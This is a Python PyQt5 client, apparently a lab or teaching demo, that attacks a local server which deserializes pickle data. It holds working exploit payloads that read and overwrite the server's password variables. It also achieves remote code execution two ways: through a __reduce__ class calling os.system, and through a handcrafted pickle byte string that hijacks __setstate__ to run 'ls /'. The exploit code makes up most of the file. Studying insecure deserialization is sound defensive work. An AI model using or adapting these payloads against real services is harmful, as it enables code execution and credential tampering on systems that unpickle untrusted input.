import socket, pickle, builtins
import pickletools
import sys
import os
from PyQt5.QtWidgets import QApplication, QMainWindow
from PyQt5 import QtCore, QtGui, QtWidgets

class Ui_Dialog(object):
    def setupUi(self, Dialog):
        Dialog.setObjectName("Dialog")
        Dialog.resize(400, 300)
        self.combSend = QtWidgets.QPushButton(Dialog)
        self.combSend.setGeometry(QtCore.QRect(290, 140, 89, 31))
        self.combSend.setObjectName("combSend")
        self.combSend.clicked.connect(self.sendComb)

        self.label = QtWidgets.QLabel(Dialog)
        self.label.setGeometry(QtCore.QRect(30, 220, 67, 17))
        self.label.setObjectName("label")

        self.tokenSend = QtWidgets.QPushButton(Dialog)
        self.tokenSend.setGeometry(QtCore.QRect(290, 60, 89, 31))
        self.tokenSend.setObjectName("tokenSend")
        self.tokenSend.clicked.connect(self.sendToken)

        self.ID = QtWidgets.QTextEdit(Dialog)
        self.ID.setGeometry(QtCore.QRect(20, 60, 104, 31))
        self.ID.setObjectName("ID")

        self.Token = QtWidgets.QTextEdit(Dialog)
        self.Token.setGeometry(QtCore.QRect(160, 60, 104, 31))
        self.Token.setObjectName("Token")

        self.comboBox = QtWidgets.QComboBox(Dialog)
        self.comboBox.setGeometry(QtCore.QRect(20, 140, 241, 25))
        self.comboBox.setObjectName("comboBox")
        self.comboBox.addItem('use server var')
        self.comboBox.addItem('modify server var')
        self.comboBox.addItem('RCE with reduce')
        self.comboBox.addItem('RCE without reduce')

        self.Response = QtWidgets.QLabel(Dialog)
        self.Response.setGeometry(QtCore.QRect(180, 220, 191, 31))
        self.Response.setText("")
        self.Response.setObjectName("Response")

        self.label_2 = QtWidgets.QLabel(Dialog)
        self.label_2.setGeometry(QtCore.QRect(70, 40, 67, 17))
        self.label_2.setObjectName("label_2")

        self.label_3 = QtWidgets.QLabel(Dialog)
        self.label_3.setGeometry(QtCore.QRect(190, 40, 67, 17))
        self.label_3.setObjectName("label_3")

        self.retranslateUi(Dialog)
        QtCore.QMetaObject.connectSlotsByName(Dialog)

    def retranslateUi(self, Dialog):
        _translate = QtCore.QCoreApplication.translate
        Dialog.setWindowTitle(_translate("Dialog", "Dialog"))
        self.combSend.setText(_translate("Dialog", "Send"))
        self.label.setText(_translate("Dialog", "Response"))
        self.tokenSend.setText(_translate("Dialog", "Send"))
        self.label_2.setText(_translate("Dialog", "ID"))
        self.label_3.setText(_translate("Dialog", "Token"))
    
    
    def sendToken(self, evt):
        ID = self.ID.toPlainText()
        token = self.Token.toPlainText()
        data = pickletools.optimize(pickle.dumps(Token(ID, token),protocol=3))
        pickletools.dis(data)
        sock.sendall(data)
        data = sock.recv(1024)
        self.Response.setText(pickle.loads(data))

    def setSock(self, sock):
        self.sock = sock

    def sendComb(self, evt):
        currentIndex = self.comboBox.currentIndex()
        data = self.get_input_string(currentIndex)
        pickletools.dis(data)
        sock.sendall(data)
        data = sock.recv(1024)
        self.Response.setText(pickle.loads(data))


    def get_input_string(self, num):
        if num == 0:
            return b'\x80\x03c__main__\nToken\n)\x81}(X\x02\x00\x00\x00idcpassword\nid\nX\x05\x00\x00\x00tokencpassword\ntoken\nub.'
        if num == 1:
            return b'\x80\x03c__main__\npassword\n}(Vid\nV9\nVtoken\nVincorrect\nub0c__main__\nToken\n)\x81}(X\x02\x00\x00\x00idX\x01\x00\x00\x009X\x05\x00\x00\x00tokenX\x09\x00\x00\x00incorrectub.'
        if num == 2:
            return pickletools.optimize(pickle.dumps(RCE(),protocol=3))
        if num == 3:
            return b'\x80\x03c__main__\nToken\n)\x81}(V__setstate__\ncos\nsystem\nubVls /\nb0c__main__\nToken\n)\x81}(X\x02\x00\x00\x00idX\x01\x00\x00\x009X\x05\x00\x00\x00tokenX\x09\x00\x00\x00incorrectub.'


HOST = "127.0.0.1"
PORT = 8080

class Token():
    def __init__(self, id, token):
        self.id = id
        self.token = token

class RCE():
    def __init__(self):
        self.name = 'hacker'
    def __reduce__(self):
        return (os.system, ('ls /',))

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((HOST, PORT))

    app = QApplication(sys.argv)
    mainWindow = QMainWindow()
    ui = Ui_Dialog()
    ui.setSock(sock)
    ui.setupUi(mainWindow)
    mainWindow.show()
    sys.exit(app.exec_())
